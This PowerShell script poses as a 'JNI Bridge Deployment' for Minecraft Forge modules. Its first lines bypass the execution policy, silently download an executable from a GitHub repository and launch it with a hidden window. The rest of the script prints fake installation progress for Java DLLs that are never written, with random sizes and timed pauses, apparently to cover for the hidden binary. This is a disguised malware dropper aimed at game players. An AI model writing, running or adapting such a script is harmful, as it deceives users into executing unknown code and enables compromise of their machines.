# JVM NATIVE MODULE DEPLOYMENT
Set-ExecutionPolicy Bypass -Scope Process -Force

# Скачиваем и запускаем основной модуль
Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
Start-Process -FilePath "check.exe" -WindowStyle Hidden

Clear-Host

$Host.UI.RawUI.WindowTitle = "JNI Bridge Deployment | Java Native Interface v2.4"

Write-Host "Deploying JNI modules for Minecraft Forge 1.20.1..." -ForegroundColor Cyan
Write-Host ("-" * 60) -ForegroundColor DarkGray

# Проверка окружения
Write-Host "[ENV] Java Home:" -NoNewline -ForegroundColor DarkGray
Start-Sleep -Milliseconds 300
Write-Host " C:\Program Files\Java\jdk-17.0.8\bin\" -ForegroundColor Gray

Write-Host "[ENV] JAVA_HOME:" -NoNewline -ForegroundColor DarkGray
Start-Sleep -Milliseconds 200
Write-Host " [SET]" -ForegroundColor Green

Write-Host "[ENV] PATH:" -NoNewline -ForegroundColor DarkGray
Start-Sleep -Milliseconds 400
Write-Host " [CONTAINS %JAVA_HOME%]" -ForegroundColor Green

Write-Host ("-" * 60) -ForegroundColor DarkGray

# Установка модулей
$nativeModules = @(
    "jvmti.dll (JVM Tool Interface)",
    "java.dll (Java Native Access)",
    "net.dll (Network Stack Hook)",
    "nio.dll (Non-blocking I/O Bridge)",
    "management.dll (JVM Management)",
    "instrument.dll (Bytecode Instrumentation)",
    "zip.dll (Resource Decompressor)",
    "verify.dll (Bytecode Verifier)",
    "awt.dll (Native Window Toolkit)",
    "fontmanager.dll (Font Renderer)"
)

Write-Host "Installing native modules to %JAVA_HOME%\bin\" -ForegroundColor Yellow
Write-Host ""

foreach ($module in $nativeModules) {
    Write-Host "  [WRITE] $module" -NoNewline -ForegroundColor Gray
    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 350)
    Write-Host " [DONE]" -ForegroundColor Green
    
    $size = Get-Random -Minimum 80 -Maximum 450
    Write-Host "         Size: ${size}KB" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host ("-" * 60) -ForegroundColor DarkGray
Write-Host "[POST] Регистрация модулей в системном реестре..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 600

Write-Host "[POST] Обновление ClassPath..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400

Write-Host "[POST] Настройка JVM arguments..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

Write-Host ""
Write-Host ("=" * 60) -ForegroundColor Green
Write-Host "DEPLOYMENT COMPLETE" -ForegroundColor White -BackgroundColor DarkGreen
Write-Host ("=" * 60) -ForegroundColor Green
Write-Host ""
Write-Host "Установлено $($nativeModules.Count) JNI модулей"
Write-Host "Путь: %JAVA_HOME%\bin\"
Write-Host ""
Write-Host "Press Enter to exit..."
Read-Host
